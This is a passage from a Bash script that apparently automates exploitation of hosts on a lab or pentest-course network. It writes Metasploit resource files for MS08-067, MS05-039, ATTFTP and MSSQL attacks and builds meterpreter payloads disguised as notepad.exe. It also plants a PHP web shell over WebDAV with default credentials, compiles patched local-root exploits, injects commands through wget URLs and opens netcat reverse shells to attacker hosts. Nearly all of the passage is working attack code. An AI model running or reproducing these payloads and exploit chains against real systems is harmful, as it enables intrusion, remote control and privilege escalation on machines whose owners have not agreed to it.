                  xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat SMB 2.2 RRBO ;)" -e perl /pentest/exploits/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 10.10.10.12 -h 10.10.11.222
                 fi
                 if [ $uip == "10.10.13.222" ]; then
                  xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat SMB 2.2 RRBO ;)" -e perl /pentest/exploits/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 10.10.12.10 -h 10.10.13.222
                 fi
                 if [ $uip == "10.10.15.222" ]; then
                  xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Redhat SMB 2.2 RRBO ;)" -e perl /pentest/exploits/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 10.10.14.10 -h 10.10.15.222
                 fi

                else 

# start jeff 

                 if [ `echo $uip | cut -d"." -f4` == "223" ]; then

# make jeff web directory 

                  if [ ! -d  /var/www/jeff1 ];then
                   mkdir /var/www/jeff1
                  fi
                  if [ ! -d  /var/www/jeff2 ];then
                   mkdir /var/www/jeff2
                  fi
                  if [ ! -d  /var/www/jeff3 ];then
                   mkdir /var/www/jeff3
                  fi

# make jeff reverse https shell

                  if [ ! -f /var/www/jeff1/notepad.exe ];then
                   $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=443 R | $msfp/msfencode -e x86/shikata_ga_nai -c 2 -t exe -o /var/www/jeff1/notepad.exe
                  fi
                  if [ ! -f /var/www/jeff2/notepad.exe ];then
                   $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=443 R | $msfp/msfencode -e x86/shikata_ga_nai -c 2 -t exe -o /var/www/jeff2/notepad.exe
                  fi
                  if [ ! -f /var/www/jeff3/notepad.exe ];then
                   $msfp/msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 R | $msfp/msfencode -e x86/shikata_ga_nai -c 2 -t exe -o /var/www/jeff3/notepad.exe
                  fi

# makes evil php for execution of commands in webdav
                  if [ ! -f /var/www/jeff1/get.php ];then
                   echo "<?php @system(\$_GET['cmd']); ?>" > /var/www/jeff1/get.php
                  fi
                  if [ ! -f /var/www/jeff2/get.php ];then
                   echo "<?php @system(\$_GET['cmd']); ?>" > /var/www/jeff2/get.php
                  fi
                  if [ ! -f /var/www/jeff3/get.php ];then
                   echo "<?php @system(\$_GET['cmd']); ?>" > /var/www/jeff3/get.php
                  fi

# make jeff cadaver rc file

                  if [ ! -f /var/www/jeff1/cadaver.rc ];then
                   echo -e "open http://10.10.11.223/webdav" > /var/www/jeff1/cadaver.rc
                   echo -e "put /var/www/jeff1/notepad.exe notepad.exe" >> /var/www/jeff1/cadaver.rc
                   echo -e "put /var/www/jeff1/get.php get.php" >> /var/www/jeff1/cadaver.rc
                   echo -e "quit" >> /var/www/jeff1/cadaver.rc
                  fi
                  if [ ! -f /var/www/jeff2/cadaver.rc ];then
                   echo -e "open http://10.10.13.223/webdav" > /var/www/jeff2/cadaver.rc
                   echo -e "put /var/www/jeff2/notepad.exe notepad.exe" >> /var/www/jeff2/cadaver.rc
                   echo -e "put /var/www/jeff2/get.php get.php" >> /var/www/jeff2/cadaver.rc
                   echo -e "quit" >> /var/www/jeff2/cadaver.rc
                  fi
                  if [ ! -f /var/www/jeff3/cadaver.rc ];then
                   echo -e "open http://10.10.15.223/webdav" > /var/www/jeff3/cadaver.rc
                   echo -e "put /var/www/jeff3/notepad.exe notepad.exe" >> /var/www/jeff3/cadaver.rc
                   echo -e "put /var/www/jeff3/get.php get.php" >> /var/www/jeff3/cadaver.rc
                   echo -e "quit" >> /var/www/jeff3/cadaver.rc
                  fi

# start jeff exploitation process

                  if [ $uip == "10.10.11.223" ]; then
                   echo -e "wampp\nxampp\n" | cadaver -r /var/www/jeff1/cadaver.rc
                   wget http://10.10.11.223/webdav/get.php?cmd=c:\\xampp\\webdav\\notepad.exe%00
                   sleep 30
                   killall -9 wget
                  fi
                  if [ $uip == "10.10.13.223" ]; then
                   echo -e "wampp\nxampp\n" | cadaver -r /var/www/jeff2/cadaver.rc
                   wget http://10.10.13.223/webdav/get.php?cmd=c:\\xampp\\webdav\\notepad.exe%00
                   sleep 30
                   killall -9 wget
                  fi
                  if [ $uip == "10.10.15.223" ]; then
                   echo -e "wampp\nxampp\n" | cadaver -r /var/www/jeff3/cadaver.rc
                   wget http://10.10.14.223/webdav/get.php?cmd=c:\\xampp\\webdav\\notepad.exe%00
                   sleep 30
                   killall -9 wget
                  fi

                 else

# start ubuntu 224 cscart                  

                  if [ `echo $uip | cut -d"." -f4` == "224" ]; then
  
                   if [ ! -d /var/www/224 ]; then
                    mkdir /var/www/224
                   fi

# make the fsk exploit and correct for the environment

                   if [ ! -f /var/www/224/fsk11.php ];then
                    cat /pentest/exploits/exploitdb/platforms/php/webapps/1964.php |\
                    sed -r 's/(\$packet=\"POST \"\.\$p\.\")(.*)/\1classes\/fckeditor\/editor\/filemanager\/browser\/default\/connectors\/php\/connector\.php\?Command\=FileUpload\&Type\=File\&CurrentFolder\= HTTP\/1\.0\\r\\n\"\;/g' |\
                    sed -r 's/(\$packet\=\"GET \"\.\$p\.\"images\/)(.*)/\1"\.\$filename\.\" HTTP\/1\.0\\r\\n\"\;/g' > /var/www/224/fsk11.php
                   fi
                   if [ ! -f /var/www/224/fsk13.php ];then
                    cat /pentest/exploits/exploitdb/platforms/php/webapps/1964.php |\
                    sed -r 's/(\$packet=\"POST \"\.\$p\.\")(.*)/\1classes\/fckeditor\/editor\/filemanager\/browser\/default\/connectors\/php\/connector\.php\?Command\=FileUpload\&Type\=File\&CurrentFolder\= HTTP\/1\.0\\r\\n\"\;/g' |\
                    sed -r 's/(\$packet\=\"GET \"\.\$p\.\"images\/)(.*)/\1"\.\$filename\.\" HTTP\/1\.0\\r\\n\"\;/g' > /var/www/224/fsk13.php
                   fi
                   if [ ! -f /var/www/224/fsk15.php ];then
                    cat /pentest/exploits/exploitdb/platforms/php/webapps/1964.php |\
                    sed -r 's/(\$packet=\"POST \"\.\$p\.\")(.*)/\1classes\/fckeditor\/editor\/filemanager\/browser\/default\/connectors\/php\/connector\.php\?Command\=FileUpload\&Type\=File\&CurrentFolder\= HTTP\/1\.0\\r\\n\"\;/g' |\
                    sed -r 's/(\$packet\=\"GET \"\.\$p\.\"images\/)(.*)/\1"\.\$filename\.\" HTTP\/1\.0\\r\\n\"\;/g' > /var/www/224/fsk15.php
                   fi

# make local root exploit

                   if [ ! -f /var/www/224/36038-6.c ]; then
                    wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c
                    gcc -w /var/www/224/36038-6.c -o /var/www/224/send-socket
                   fi

# exploit systems with command execution and local root + nc shell reverse

                   if [ $uip == "10.10.11.224" ]; then
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu CS cart root shell" -e nc -lvp 8080 &
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu fsk wget send-socket" -e php /var/www/224/fsk11.php 10.10.11.224 / wget http://10.10.10.12/224/send-socket &
                    sleep 30s
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu nc send shell" -e 'php /var/www/224/fsk11.php 10.10.11.224 / echo -e "./send-socket\n" | /bin/nc 10.10.10.12 8080 -e /bin/sh'
                   fi
                   if [ $uip == "10.10.13.224" ]; then
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu CS cart root shell" -e nc -lvp 8080 &
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu fsk wget send-socket" -e php /var/www/224/fsk13.php 10.10.13.224 / wget http://10.10.12.10/224/send-socket &
                    sleep 30s
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu nc send shell" -e 'php /var/www/224/fsk13.php 10.10.13.224 / echo -e "./send-socket\n" | /bin/nc 10.10.12.10 8080 -e /bin/sh'
                   fi
                   if [ $uip == "10.10.15.224" ]; then
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu CS cart root shell" -e nc -lvp 8080 &
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu fsk wget send-socket" -e php /var/www/224/fsk15.php 10.10.15.224 / wget http://10.10.14.10/224/send-socket &
                    sleep 30s
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "Ubuntu nc send shell" -e 'php /var/www/224/fsk15.php 10.10.15.224 / echo -e "./send-socket\n" | /bin/nc 10.10.14.10 8080 -e /bin/sh'                    
                   fi

                  else 

# start IT Joe .... Now to pivot or Not to pivot... tis is the question

                   if [ `echo $uip | cut -d"." -f4` == "226" ];then
                 #  [ `grep "0x7c86fed3" /pentest/exploits/framework3/modules/exploits/windows/tftp/attftp_long_filename.rb  | tr -s "\t" " "  | cut -d" " -f9` == "0x7c86fed3" ]; then

# make IT Joe resource files                    

                    if [ ! -f $msfs/joe11.rc ];then 
                     echo -e "use exploit/windows/tftp/attftp_long_filename" > $msfs/joe11.rc
                     echo -e "set rhost 10.10.11.226" >> $msfs/joe11.rc
                     echo -e "set lhost 10.10.10.12" >> $msfs/joe11.rc
                     echo -e "set DisablePayloadHandler True" >> $msfs/joe11.rc
                     echo -e "set lport 443" >> $msfs/joe11.rc
                     echo -e "set target 9" >> $msfs/joe11.rc
                     echo -e "set payload windows/meterpreter/reverse_nonx_tcp" >> $msfs/joe11.rc
                     echo -e "exploit" >> $msfs/joe11.rc
                     #echo -e "exit" >> $msfs/joe11.rc
                    fi
                    if [ ! -f $msfs/joe13.rc ];then 
                     echo -e "use exploit/windows/tftp/attftp_long_filename" > $msfs/joe13.rc
                     echo -e "set rhost 10.10.13.226" >> $msfs/joe13.rc
                     echo -e "set lhost 10.10.12.10" >> $msfs/joe13.rc
                     echo -e "set DisablePayloadHandler True" >> $msfs/joe13.rc
                     echo -e "set lport 443" >> $msfs/joe13.rc
                     echo -e "set target 9" >> $msfs/joe13.rc
                     echo -e "set payload windows/meterpreter/reverse_nonx_tcp" >> $msfs/joe13.rc
                     echo -e "exploit" >> $msfs/joe13.rc
                     #echo -e "exit" >> $msfs/joe13.rc
                    fi
                    if [ ! -f $msfs/joe15.rc ];then 
                     echo -e "use exploit/windows/tftp/attftp_long_filename" > $msfs/joe15.rc
                     echo -e "set rhost 10.10.15.226" >> $msfs/joe15.rc
                     echo -e "set lhost 10.10.14.10" >> $msfs/joe15.rc
                     echo -e "set DisablePayloadHandler True" >> $msfs/joe15.rc
                     echo -e "set lport 443" >> $msfs/joe15.rc
                     echo -e "set target 9" >> $msfs/joe15.rc
                     echo -e "set payload windows/meterpreter/reverse_nonx_tcp" >> $msfs/joe15.rc
                     echo -e "exploit" >> $msfs/joe15.rc
                    # echo -e "exit" >> $msfs/joe15.rc
                    fi

# start exploitation process

                    if [ $uip == "10.10.11.226" ]; then
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "IT Joe is my Bitch ;)" -e $msfc -r $msfs/joe11.rc
                    fi
                    if [ $uip == "10.10.13.226" ]; then
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "IT Joe is my Bitch ;)" -e $msfc -r $msfs/joe13.rc
                    fi
                    if [ $uip == "10.10.15.226" ]; then
                    xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "IT Joe is my Bitch ;)" -e $msfc -r $msfs/joe15.rc
                    fi           

                   else

# start websql 
            
                    if [ `echo $uip | cut -d"." -f4` == "227" ]; then
               
# make websql srv resource files
     
                     if [ ! -f $msfs/srv11.rc ];then 
                      echo -e "use exploit/windows/smb/ms05_039_pnp" > $msfs/srv11.rc
                      echo -e "set target 0" >> $msfs/srv11.rc
                      echo -e "set rhost 10.10.11.227" >> $msfs/srv11.rc
                      echo -e "set lhost 10.10.10.12" >> $msfs/srv11.rc
                      echo -e "set disablepayloadhandler true" >> $msfs/srv11.rc
                      echo -e "set lport 443" >> $msfs/srv11.rc
                      echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/srv11.rc
                      echo -e "exploit" >> $msfs/srv11.rc
                      echo -e "exit" >> $msfs/srv11.rc
                     fi
                     if [ ! -f $msfs/srv13.rc ];then 
                      echo -e "use exploit/windows/smb/ms05_039_pnp" > $msfs/srv13.rc
                      echo -e "set target 0" >> $msfs/srv13.rc
                      echo -e "set rhost 10.10.13.227" >> $msfs/srv13.rc
                      echo -e "set lhost 10.10.12.10" >> $msfs/srv13.rc
                      echo -e "set disablepayloadhandler true" >> $msfs/srv13.rc
                      echo -e "set lport 443" >> $msfs/srv13.rc
                      echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/srv13.rc
                      echo -e "exploit" >> $msfs/srv13.rc
                      echo -e "exit" >> $msfs/srv13.rc
                     fi
                     if [ ! -f $msfs/srv15.rc ];then 
                      echo -e "use exploit/windows/smb/ms05_039_pnp" > $msfs/srv15.rc
                      echo -e "set target 0" >> $msfs/srv15.rc
                      echo -e "set rhost 10.10.15.227" >> $msfs/srv15.rc
                      echo -e "set lhost 10.10.14.10" >> $msfs/srv15.rc
                      echo -e "set disablepayloadhandler true" >> $msfs/srv15.rc
                      echo -e "set lport 443" >> $msfs/srv15.rc
                      echo -e "set payload windows/meterpreter/reverse_tcp" >> $msfs/srv15.rc
                      echo -e "exploit" >> $msfs/srv15.rc
                      echo -e "exit" >> $msfs/srv15.rc
                     fi

# start exploitation process of websql srv

                     if [ $uip == "10.10.11.227" ]; then             
                      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "All your SQL are belong to US" -e $msfc -r $msfs/srv11.rc
                     fi
                     if [ $uip == "10.10.13.227" ]; then             
                      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "All your SQL are belong to US" -e $msfc -r $msfs/srv13.rc
                     fi
                     if [ $uip == "10.10.15.227" ]; then             
                      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "All your SQL are belong to US" -e $msfc -r $msfs/srv15.rc
                     fi

                    else

# start thinmail

                     if [ `echo $uip | cut -d"." -f4` == "229" ]; then
                     
# start thinmail resource files

                      if [ ! -f $msfs/thinmail11.rc ];then
                       echo -e "use exploit/windows/smb/ms08_067_netapi" > $msfs/thinmail11.rc
                       echo -e "set RHOST 10.10.11.229" >> $msfs/thinmail11.rc
                       echo -e "set LHOST 10.10.10.12" >> $msfs/thinmail11.rc
                       echo -e "set LPORT 443\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/thinmail11.rc
                       echo -e "set disablepayloadhandler true" >> $msfs/thinmail11.rc
                       echo -e "exploit" >> $msfs/thinmail11.rc
                       echo -e "exit" >> $msfs/thinmail11.rc
                      fi
                      if [ ! -f $msfs/thinmail13.rc ];then
                       echo -e "use exploit/windows/smb/ms08_067_netapi" > $msfs/thinmail13.rc
                       echo -e "set RHOST 10.10.13.229" >> $msfs/thinmail13.rc
                       echo -e "set LHOST 10.10.12.10" >> $msfs/thinmail13.rc
                       echo -e "set LPORT 443\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/thinmail13.rc
                       echo -e "set disablepayloadhandler true" >> $msfs/thinmail13.rc
                       echo -e "exploit" >> $msfs/thinmail13.rc
                       echo -e "exit" >> $msfs/thinmail13.rc
                      fi
                      if [ ! -f $msfs/thinmail15.rc ];then
                       echo -e "use exploit/windows/smb/ms08_067_netapi" > $msfs/thinmail15.rc
                       echo -e "set RHOST 10.10.15.229" >> $msfs/thinmail15.rc
                       echo -e "set LHOST 10.10.14.10" >> $msfs/thinmail15.rc
                       echo -e "set LPORT 443\nset PAYLOAD windows/meterpreter/reverse_tcp" >> $msfs/thinmail15.rc
                       echo -e "set disablepayloadhandler true" >> $msfs/thinmail15.rc
                       echo -e "exploit" >> $msfs/thinmail15.rc
                       echo -e "exit" >> $msfs/thinmail15.rc
                      fi

# start thinmail exploitation process

                      if [ $uip == "10.10.11.229" ]; then
                      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "I can haz ur mail" -e $msfc -r $msfs/thinmail11.rc
                      fi
                      if [ $uip == "10.10.13.229" ]; then
                      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "I can haz ur mail" -e $msfc -r $msfs/thinmail13.rc
                      fi
                      if [ $uip == "10.10.15.229" ]; then
                      xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "I can haz ur mail" -e $msfc -r $msfs/thinmail15.rc
                      fi

                     else


                      if [ `echo $uip | cut -d"." -f4` == "230" ]; then
                       echo "skippping this machine"
                      
                      else

# start ralph exploitation process

                       if [ `echo $uip | cut -d"." -f4` == "231" ]; then

                        if [ ! -f $msfs/ralph11.rc ];then
                         echo -e "use windows/mssql/mssql_payload" > $msfs/ralph11.rc
                         echo -e "set password password" >> $msfs/ralph11.rc
                         echo -e "set rhost 10.10.11.231" >> $msfs/ralph11.rc
                         echo -e "set lport 443" >> $msfs/ralph11.rc
                         echo -e "set lhost 10.10.10.12" >> $msfs/ralph11.rc
                         echo -e "set DisablePayloadHandler true" >> $msfs/ralph11.rc
                         echo -e "exploit" >> $msfs/ralph11.rc
                         echo -e "exit -y" >> $msfs/ralph11.rc
                        fi
                        if [ ! -f $msfs/ralph13.rc ];then
                         echo -e "use windows/mssql/mssql_payload" > $msfs/ralph13.rc
                         echo -e "set password password" >> $msfs/ralph13.rc
                         echo -e "set rhost 10.10.13.231" >> $msfs/ralph13.rc
                         echo -e "set lport 443" >> $msfs/ralph13.rc
                         echo -e "set lhost 10.10.12.10" >> $msfs/ralph13.rc
                         echo -e "set DisablePayloadHandler true" >> $msfs/ralph13.rc
                         echo -e "exploit" >> $msfs/ralph13.rc
                         echo -e "exit -y" >> $msfs/ralph13.rc
                        fi
                        if [ ! -f $msfs/ralph15.rc ];then
                         echo -e "use windows/mssql/mssql_payload" >> $msfs/ralph15.rc
                         echo -e "set password password" >> $msfs/ralph15.rc
                         echo -e "set rhost 10.10.15.231" >> $msfs/ralph15.rc
                         echo -e "set lport 443" >> $msfs/ralph15.rc
                         echo -e "set lhost 10.10.14.10" >> $msfs/ralph15.rc
                         echo -e "set DisablePayloadHandler true" >> $msfs/ralph15.rc
                         echo -e "exploit" >> $msfs/ralph15.rc
                         echo -e "exit -y" >> $msfs/ralph15.rc
                        fi
                      
# start ralph exploitation process

                        if [ $uip == "10.10.11.231" ]; then
                         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "I just ralphed" -e $msfc -r $msfs/ralph11.rc
                        fi
                        if [ $uip == "10.10.13.231" ]; then
                         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "I just ralphed" -e $msfc -r $msfs/ralph13.rc
                        fi
                        if [ $uip == "10.10.15.231" ]; then
                         xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "I just ralphed" -e $msfc -r $msfs/ralph15.rc
                        fi

                       else

                        if [ `echo $uip | cut -d"." -f4` == "234" ]; then
                         
# make the gentoo dirt                         
                         
                         if [ ! -d /var/www/gentoo ];then
                          mkdir /var/www/gentoo
                         fi

# make the local root exploit

                         if [ ! -f /var/www/gentoo/lr11.c ];then
                          cat /pentest/exploits/exploitdb/platforms/linux/local/8572.c |\
                          sed -r 's/\/tmp\/run/\/usr\/src\/software\/cyrus-sasl-2.1.22\/utils\/run.sh/g' > /var/www/gentoo/lr11.c
                          gcc -w /var/www/gentoo/lr11.c -o /var/www/gentoo/lr11
                         fi
                         if [ ! -f /var/www/gentoo/lr13.c ];then
                          cat /pentest/exploits/exploitdb/platforms/linux/local/8572.c |\
                          sed -r 's/\/tmp\/run/\/usr\/src\/software\/cyrus-sasl-2.1.22\/utils\/run.sh/g' > /var/www/gentoo/lr13.c
                          gcc -w /var/www/gentoo/lr13.c -o /var/www/gentoo/lr13
                         fi
                         if [ ! -f /var/www/gentoo/lr15.c ];then
                          cat /pentest/exploits/exploitdb/platforms/linux/local/8572.c |\
                          sed -r 's/\/tmp\/run/\/usr\/src\/software\/cyrus-sasl-2.1.22\/utils\/run.sh/g' > /var/www/gentoo/lr15.c
                          gcc -w  /var/www/gentoo/lr15.c -o /var/www/gentoo/lr15
                         fi
                       
# make the run.sh file

                         if [ ! -f /var/www/gentoo/run11.sh ];then
                          echo '#!/bin/bash' > /var/www/gentoo/run11.sh
                          echo 'nc 10.10.10.12 5678 -e /bin/bash' >> /var/www/gentoo/run11.sh
                         fi
                         if [ ! -f /var/www/gentoo/run13.sh ];then
                          echo '#!/bin/bash' > /var/www/gentoo/run13.sh
                          echo 'nc 10.10.12.10 5678 -e /bin/bash' >> /var/www/gentoo/run13.sh
                         fi
                         if [ ! -f /var/www/gentoo/run15.sh ];then
                          echo '#!/bin/bash' > /var/www/gentoo/run15.sh
                          echo 'nc 10.10.14.10 5678 -e /bin/bash' >> /var/www/gentoo/run15.sh
                         fi

# start the exploitation process

                         if [ $uip == "10.10.11.234" ]; then
          
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget local root exploit' -e 'wget "http://10.10.11.234:10443/foo.pl?\`wget http://10.10.10.12/gentoo/lr11 -O /usr/src/software/cyrus-sasl-2.1.22/utils/lr11%26\`" && rm -rf ./foo.pl*' &
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget run.sh file' -e 'wget "http://10.10.11.234:10443/foo.pl?\`wget http://10.10.10.12/gentoo/run11.sh -O /usr/src/software/cyrus-sasl-2.1.22/utils/run.sh%26\`" && rm -rf ./foo.pl*' &
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget run.sh file' -e 'wget "http://10.10.11.234:10443/foo.pl?\`chmod 755 /usr/src/software/cyrus-sasl-2.1.22/utils/lr11%26\`" && rm -rf ./foo.pl*' & 
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "NC listener on port 5678" -e 'nc -lvp 5678' &
                          sleep 10
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch local root exploit' -e 'wget "http://10.10.11.234:10443/foo.pl?\`/usr/src/software/cyrus-sasl-2.1.22/utils/lr11 9245%26\`" && rm -rf ./foo.pl*' &

                         fi

                         if [ $uip == "10.10.13.234" ]; then
          
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget local root exploit' -e 'wget "http://10.10.13.234:10443/foo.pl?\`wget http://10.10.12.10/gentoo/lr13 -O /usr/src/software/cyrus-sasl-2.1.22/utils/lr13%26\`" && rm -rf ./foo.pl*' &
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget run.sh file' -e 'wget "http://10.10.13.234:10443/foo.pl?\`wget http://10.10.12.10/gentoo/run13.sh -O /usr/src/software/cyrus-sasl-2.1.22/utils/run.sh%26\`" && rm -rf ./foo.pl*' &
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget run.sh file' -e 'wget "http://10.10.13.234:10443/foo.pl?\`chmod 755 /usr/src/software/cyrus-sasl-2.1.22/utils/lr13%26\`" && rm -rf ./foo.pl*' & 
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "NC listener on port 5678" -e 'nc -lvp 5678' &
                          sleep 10
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch local root exploit' -e 'wget "http://10.10.13.234:10443/foo.pl?\`/usr/src/software/cyrus-sasl-2.1.22/utils/lr13 9244%26\`" && rm -rf ./foo.pl*' &

                         fi

                         if [ $uip == "10.10.15.234" ]; then
          
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget local root exploit' -e 'wget "http://10.10.15.234:10443/foo.pl?\`wget http://10.10.14.10/gentoo/lr15 -O /usr/src/software/cyrus-sasl-2.1.22/utils/lr15%26\`" && rm -rf ./foo.pl*' &
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget run.sh file' -e 'wget "http://10.10.15.234:10443/foo.pl?\`wget http://10.10.14.10/gentoo/run15.sh -O /usr/src/software/cyrus-sasl-2.1.22/utils/run.sh%26\`" && rm -rf ./foo.pl*' &
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Wget run.sh file' -e 'wget "http://10.10.15.234:10443/foo.pl?\`chmod 755 /usr/src/software/cyrus-sasl-2.1.22/utils/lr15%26\`" && rm -rf ./foo.pl*' & 
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title "NC listener on port 5678" -e 'nc -lvp 5678' &
                          sleep 10
                          xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch local root exploit' -e 'wget "http://10.10.15.234:10443/foo.pl?\`/usr/src/software/cyrus-sasl-2.1.22/utils/lr15 9244%26\`" && rm -rf ./foo.pl*' &

                         fi

                        else

                         if [ `echo $uip | cut -d"." -f4` == "235" ]; then

# check if expect is installed

                           if [ "`locate expect | grep "/usr/bin/" | cut -d"/" -f4`" != "expect" ];then
                             echo -e "\n\n\t[*] Non expect found - Updating db, please wait ....."
                             updatedb
                           fi

                           if [ "`locate expect | grep "/usr/bin/" | cut -d"/" -f4`" != "expect" ];then
                            apt-get update
                            apt-get install expect                          
                            updatedb
                           fi

# make the pain dir structure

                          if [ ! -d /var/www/pain ];then
                          mkdir /var/www/pain
                          fi

# get the reverse shell

                          if [ ! -f /var/www/pain/php-rev.tar.gz ]; then
                           wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz -O /var/www/pain/php-rev.tar.gz
                           tar /var/www/pain/php-rev.tar.gz
                           cd /vaw/www/pain/php-reverse-shell-1.0
                          fi

# make reverse shell based on subnets

                          if [ ! -f /var/www/pain/pain11.txt ];then
                           cat /var/www/pain/php-reverse-shell-1.0/php-reverse-shell.php |\ 
                           sed -r "s/ip \= '127.0.0.1'/ip \= '10.10.10.12'/g" |\
                           sed -r "s/port = 1234/port = 5432/g" > /var/www/pain/pain11.txt
                          fi
                          if [ ! -f /var/www/pain/pain13.txt ];then
                           cat /var/www/pain/php-reverse-shell-1.0/php-reverse-shell.php |\
                           sed -r "s/ip \= '127.0.0.1'/ip \= '10.10.12.10'/g" |\
                           sed -r "s/port = 1234/port = 5432/g" > /var/www/pain/pain13.txt
                          fi
                          if [ ! -f /var/www/pain/pain15.txt ];then
                           cat /var/www/pain/php-reverse-shell-1.0/php-reverse-shell.php |\
                           sed -r "s/ip \= '127.0.0.1'/ip \= '10.10.14.10'/g" |\
                           sed -r "s/port = 1234/port = 5432/g" > /var/www/pain/pain15.txt
                          fi

# make udev for pain
                          if [ ! -f /var/www/pain/udev.c ];then
                           echo -e "#include <fcntl.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <sys/stat.h>\n#include <sysexits.h>\n#include <wait.h>\n#include <signal.h>\n#include <sys/socket.h>\n#include <linux/types.h>\n#include <linux/netlink.h>" > /var/www/pain/udev.c
                           echo -e "\n#ifndef NETLINK_KOBJECT_UEVENT\n#define NETLINK_KOBJECT_UEVENT 15\n#endif" >> /var/www/pain/udev.c
